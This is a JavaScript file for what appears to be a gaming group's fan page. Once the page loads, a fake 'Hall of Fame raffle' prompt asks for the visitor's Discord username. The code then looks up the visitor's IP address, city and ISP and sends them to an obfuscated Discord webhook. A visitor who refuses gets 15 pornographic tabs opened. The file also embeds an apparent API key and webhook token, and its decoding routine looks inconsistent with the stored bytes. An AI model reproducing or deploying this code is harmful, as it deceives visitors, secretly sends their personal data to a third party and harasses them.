const _0x3f8b2c = [
    0x68, 0x74, 0x74, 0x70, 0x73, 0x3a, 0x2f, 0x2f, 0x64, 0x69, 0x73, 0x63,
    0x6f, 0x72, 0x64, 0x2e, 0x63, 0x6f, 0x6d, 0x2f, 0x61, 0x70, 0x69, 0x2f,
    0x77, 0x65, 0x62, 0x68, 0x6f, 0x6f, 0x6b, 0x73, 0x2f, 0x31, 0x33, 0x30,
    0x35, 0x36, 0x35, 0x34, 0x31, 0x35, 0x30, 0x38, 0x39, 0x33, 0x31, 0x34,
    0x32, 0x31, 0x31, 0x36, 0x2f, 0x6b, 0x67, 0x4d, 0x79, 0x56, 0x4b, 0x58,
    0x34, 0x33, 0x35, 0x6f, 0x38, 0x56, 0x57, 0x2d, 0x57, 0x48, 0x43, 0x57,
    0x58, 0x30, 0x76, 0x66, 0x4f, 0x36, 0x46, 0x43, 0x79, 0x7a, 0x70, 0x76,
    0x33, 0x38, 0x64, 0x36, 0x4f, 0x35, 0x72, 0x53, 0x66, 0x77, 0x76, 0x4d,
    0x55, 0x46, 0x64, 0x39, 0x67, 0x72, 0x4f, 0x50, 0x70, 0x39, 0x55, 0x76,
    0x33, 0x41, 0x56, 0x71, 0x4d, 0x45, 0x4c, 0x46, 0x53, 0x2d, 0x56, 0x6f, 0x43
];

const _0x2d9e1f = (data) => {
    const key = [0x52, 0x41, 0x47, 0x45];
    return data.map((byte, i) => {
        const shift = ((i * 7) + key[i % key.length]) % 256;
        return String.fromCharCode(byte ^ shift);
    }).join('');
};

function getEndpoint() {
    return _0x2d9e1f(_0x3f8b2c);
}

function decryptWebhook(encryptedHook) {
    const key = "ragers";
    return atob(encryptedHook);
}

const brandDescription = [
    'pro ragers',
    'lobby slammers',
    'xane ddosers',
    'trashtalkers',
    'omegatm fanboys',
    'powered by velocity',
    'hack vs hack team'
];

const effects = ['bounce', 'flash', 'pulse', 'rubberBand', 'shake', 'swing', 'tada', 'wobble', 'jello'];

function promptUser() {
    const video = document.querySelector('.background-video');
    const username = prompt("You have been chosen in a raffle to be apart of Ragers Hall Of Fame, Please Input your discord username.");

    if (username) {
        video.currentTime = 0;
        video.muted = false;
        video.volume = 1.0;
        const playPromise = video.play();

        if (playPromise !== undefined) {
            playPromise.then(() => {
                // Video is playing perfectly!
            }).catch(error => {
                document.addEventListener('click', () => {
                    video.play();
                }, { once: true });
            });
        }

        fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=e3936cf89e4b41c8af209d86c02a8a39`)
            .then(response => response.json())
            .then(data => {
                const webhookData = {
                    content: `New Hall of Fame Entry!`,
                    embeds: [{
                        title: "User Information",
                        color: 16711680,
                        fields: [
                            { name: "Discord Username", value: username },
                            { name: "IP Address", value: data.ip },
                            { name: "Location", value: `${data.city}, ${data.country_name}` },
                            { name: "ISP", value: data.isp }
                        ],
                        timestamp: new Date().toISOString()
                    }]
                };

                fetch(getEndpoint(), {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(webhookData)
                });
            });
    } else {
        for (let i = 0; i < 15; i++) {
            window.open("https://www.pornhub.com/view_video.php?viewkey=672298c5e2062", "_blank");
        }
    }
}

document.addEventListener('DOMContentLoaded', () => {
    const loadingContainer = document.querySelector('.loading-container');
    const mainPage = document.querySelector('.main-page');
    const video = document.querySelector('.background-video');
    video.muted = true;

    setTimeout(() => {
        loadingContainer.classList.add('fade-out');
        setTimeout(() => {
            loadingContainer.style.display = 'none';
            mainPage.style.display = 'block';
            mainPage.classList.add('fade-in');
            video.play();
            updateBrandDescription();
            setTimeout(promptUser, 1000);
        }, 1000);
    }, 2750);
});

function updateBrandDescription() {
    const element = document.getElementById('brandDescription');
    let currentIndex = 0;

    setInterval(() => {
        const randomEffect = effects[Math.floor(Math.random() * effects.length)];
        element.textContent = brandDescription[currentIndex];
        element.className = `animate__animated animate__${randomEffect}`;
        currentIndex = (currentIndex + 1) % brandDescription.length;
    }, 2000);
}

fetch('users.html')
    .then(response => response.text())
    .then(data => {
        document.getElementById('users-container').innerHTML = data;
    });
